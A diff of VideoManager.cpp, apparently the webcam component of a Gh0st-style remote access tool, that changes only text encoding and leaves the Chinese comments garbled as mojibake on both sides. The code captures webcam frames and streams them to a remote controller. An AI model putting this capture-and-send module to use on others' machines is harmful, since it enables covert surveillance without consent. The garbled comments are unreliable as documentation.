@@ -1,4 +1,4 @@
-// VideoManager.cpp: implementation of the CVideoManager class.
+ï»¿// VideoManager.cpp: implementation of the CVideoManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -19,7 +19,7 @@ CVideoManager::CVideoManager(IOCPClient* ClientObject, int n, void* user) : CMan
     m_pVideoCodec = NULL;
     m_fccHandler = 1129730893;
 
-    m_CapVideo.Open(0,0);  // ¿ªÆô
+    m_CapVideo.Open(0,0);  // å¼€å¯
     lpBuffer = NULL;
 
     m_hWorkThread = __CreateThread(NULL, 0, WorkThread, this, 0, NULL);
@@ -31,25 +31,25 @@ DWORD CVideoManager::WorkThread(LPVOID lParam)
     CVideoManager *This = (CVideoManager *)lParam;
     static ULONGLONG	dwLastScreen = GetTickCount64();
 
-    if (This->Initialize()) {        //×ªµ½Initialize
-        This->m_bIsCompress=true;    //Èç¹û³õÊ¼»¯³É¹¦¾ÍÉèÖÃ¿ÉÒÔÑ¹Ëõ
-        Mprintf("Ñ¹ËõÊÓÆµ½øĞĞ´«Êä.\n");
+    if (This->Initialize()) {        //è½¬åˆ°Initialize
+        This->m_bIsCompress=true;    //å¦‚æœåˆå§‹åŒ–æˆåŠŸå°±è®¾ç½®å¯ä»¥å‹ç¼©
+        Mprintf("å‹ç¼©è§†é¢‘è¿›è¡Œä¼ è¾“.\n");
     }
 
-    This->SendBitMapInfor();         //·¢ËÍbmpÎ»Í¼½á¹¹
+    This->SendBitMapInfor();         //å‘é€bmpä½å›¾ç»“æ„
 
-    // µÈ¿ØÖÆ¶Ë¶Ô»°¿ò´ò¿ª
+    // ç­‰æ§åˆ¶ç«¯å¯¹è¯æ¡†æ‰“å¼€
     This->WaitForDialogOpen();
 #if USING_ZLIB
-    const int fps = 8;// Ö¡ÂÊ
+    const int fps = 8;// å¸§ç‡
 #else
-    const int fps = 8;// Ö¡ÂÊ
+    const int fps = 8;// å¸§ç‡
 #endif
-    const int sleep = 1000 / fps;// ¼ä¸ôÊ±¼ä£¨ms£©
+    const int sleep = 1000 / fps;// é—´éš”æ—¶é—´ï¼ˆmsï¼‰
 
     timeBeginPeriod(1);
     while (This->m_bIsWorking) {
-        // ÏŞÖÆËÙ¶È
+        // é™åˆ¶é€Ÿåº¦
         int span = sleep-(GetTickCount64() - dwLastScreen);
         Sleep(span > 0 ? span : 1);
         if (span < 0)
@@ -73,7 +73,7 @@ CVideoManager::~CVideoManager()
     WaitForSingleObject(m_hWorkThread, INFINITE);
     SAFE_CLOSE_HANDLE(m_hWorkThread);
     Mprintf("CVideoManager ~CVideoManager \n");
-    if (m_pVideoCodec) { //Ñ¹ËõÀà
+    if (m_pVideoCodec) { //å‹ç¼©ç±»
         delete m_pVideoCodec;
         m_pVideoCodec = NULL;
     }
@@ -85,7 +85,7 @@ void CVideoManager::Destroy()
 {
     m_bIsWorking = FALSE;
     Mprintf("CVideoManager Destroy \n");
-    if (m_pVideoCodec) { //Ñ¹ËõÀà
+    if (m_pVideoCodec) { //å‹ç¼©ç±»
         delete m_pVideoCodec;
         m_pVideoCodec = NULL;
     }
@@ -115,14 +115,14 @@ BOOL CVideoManager::SendNextScreen()
     lpBuffer = lpBuffer ? lpBuffer : new BYTE[nBufferLen];
 
     lpBuffer[0] = TOKEN_WEBCAM_DIB;
-    lpBuffer[1] = m_bIsCompress;   //Ñ¹Ëõ
+    lpBuffer[1] = m_bIsCompress;   //å‹ç¼©
 
-    memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));     //ÕâÀï½«ÊÓÆµÑ¹ËõÂëĞ´ÈëÒª·¢ËÍµÄ»º³åÇø
+    memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));     //è¿™é‡Œå°†è§†é¢‘å‹ç¼©ç å†™å…¥è¦å‘é€çš„ç¼“å†²åŒº
 
     UINT	nPacketLen = 0;
-    if (m_bIsCompress && m_pVideoCodec) { //ÕâÀïÅĞ¶Ï£¬ÊÇ·ñÑ¹Ëõ£¬Ñ¹ËõÂëÊÇ·ñ³õÊ¼»¯³É¹¦£¬Èç¹û³É¹¦¾ÍÑ¹Ëõ
+    if (m_bIsCompress && m_pVideoCodec) { //è¿™é‡Œåˆ¤æ–­ï¼Œæ˜¯å¦å‹ç¼©ï¼Œå‹ç¼©ç æ˜¯å¦åˆå§‹åŒ–æˆåŠŸï¼Œå¦‚æœæˆåŠŸå°±å‹ç¼©
         int	nCompressLen = 0;
-        //ÕâÀïÑ¹ËõÊÓÆµÊı¾İÁË
+        //è¿™é‡Œå‹ç¼©è§†é¢‘æ•°æ®äº†
         bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB,
                     m_CapVideo.GetBmpInfor()->bmiHeader.biSizeImage, lpBuffer + nHeadLen,
                     &nCompressLen, NULL);
@@ -130,11 +130,11 @@ BOOL CVideoManager::SendNextScreen()
             // some thing error
             return FALSE;
         }
-        //ÖØĞÂ¼ÆËã·¢ËÍÊı¾İ°üµÄ´óĞ¡  Ê£ÏÂ¾ÍÊÇ·¢ËÍÁË£¬ÎÒÃÇµ½Ö÷¿Ø¶Ë¿´Ò»ÏÂÊÓÆµÈç¹ûÑ¹ËõÁËÔõÃ´´¦Àí
-        //µ½Ö÷¿Ø¶ËµÄvoid CVideoDlg::OnReceiveComplete(void)
+        //é‡æ–°è®¡ç®—å‘é€æ•°æ®åŒ…çš„å¤§å°  å‰©ä¸‹å°±æ˜¯å‘é€äº†ï¼Œæˆ‘ä»¬åˆ°ä¸»æ§ç«¯çœ‹ä¸€ä¸‹è§†é¢‘å¦‚æœå‹ç¼©äº†æ€ä¹ˆå¤„ç†
+        //åˆ°ä¸»æ§ç«¯çš„void CVideoDlg::OnReceiveComplete(void)
         nPacketLen = nCompressLen + nHeadLen;
     } else {
-        //²»Ñ¹Ëõ  ÓÀÔ¶²»À´
+        //ä¸å‹ç¼©  æ°¸è¿œä¸æ¥
         memcpy(lpBuffer + nHeadLen, lpDIB, dwBmpImageSize);
         nPacketLen = dwBmpImageSize+ nHeadLen;
     }
@@ -153,16 +153,16 @@ VOID CVideoManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         NotifyDialogIsOpen();
         break;
     }
-    case COMMAND_WEBCAM_ENABLECOMPRESS: { // ÒªÇóÆôÓÃÑ¹Ëõ
-        // Èç¹û½âÂëÆ÷³õÊ¼»¯Õı³££¬¾ÍÆô¶¯Ñ¹Ëõ¹¦ÄÜ
+    case COMMAND_WEBCAM_ENABLECOMPRESS: { // è¦æ±‚å¯ç”¨å‹ç¼©
+        // å¦‚æœè§£ç å™¨åˆå§‹åŒ–æ­£å¸¸ï¼Œå°±å¯åŠ¨å‹ç¼©åŠŸèƒ½
         if (m_pVideoCodec)
             InterlockedExchange((LPLONG)&m_bIsCompress, true);
-        Mprintf("Ñ¹ËõÊÓÆµ½øĞĞ´«Êä.\n");
+        Mprintf("å‹ç¼©è§†é¢‘è¿›è¡Œä¼ è¾“.\n");
         break;
     }
-    case COMMAND_WEBCAM_DISABLECOMPRESS: { // Ô­Ê¼Êı¾İ´«Êä
+    case COMMAND_WEBCAM_DISABLECOMPRESS: { // åŸå§‹æ•°æ®ä¼ è¾“
         InterlockedExchange((LPLONG)&m_bIsCompress, false);
-        Mprintf("²»Ñ¹ËõÊÓÆµ½øĞĞ´«Êä.\n");
+        Mprintf("ä¸å‹ç¼©è§†é¢‘è¿›è¡Œä¼ è¾“.\n");
         break;
     }
     }
@@ -176,16 +176,16 @@ BOOL CVideoManager::Initialize()
         delete m_pVideoCodec;
         m_pVideoCodec=NULL;
     }
-    if (m_fccHandler==0) {       //²»²ÉÓÃÑ¹Ëõ
+    if (m_fccHandler==0) {       //ä¸é‡‡ç”¨å‹ç¼©
         bRet= FALSE;
         return bRet;
     }
     m_pVideoCodec = new CVideoCodec;
-    //ÕâÀï³õÊ¼»¯£¬ÊÓÆµÑ¹Ëõ £¬×¢ÒâÕâÀïµÄÑ¹ËõÂë  m_fccHandler(µ½¹¹Ôìº¯ÊıÖĞ²é¿´)
+    //è¿™é‡Œåˆå§‹åŒ–ï¼Œè§†é¢‘å‹ç¼© ï¼Œæ³¨æ„è¿™é‡Œçš„å‹ç¼©ç   m_fccHandler(åˆ°æ„é€ å‡½æ•°ä¸­æŸ¥çœ‹)
     if (!m_pVideoCodec->InitCompressor(m_CapVideo.GetBmpInfor(), m_fccHandler)) {
         delete m_pVideoCodec;
         bRet=FALSE;
-        // ÖÃNULL, ·¢ËÍÊ±ÅĞ¶ÏÊÇ·ñÎªNULLÀ´ÅĞ¶ÏÊÇ·ñÑ¹Ëõ
+        // ç½®NULL, å‘é€æ—¶åˆ¤æ–­æ˜¯å¦ä¸ºNULLæ¥åˆ¤æ–­æ˜¯å¦å‹ç¼©
         m_pVideoCodec = NULL;
     }
     return bRet;
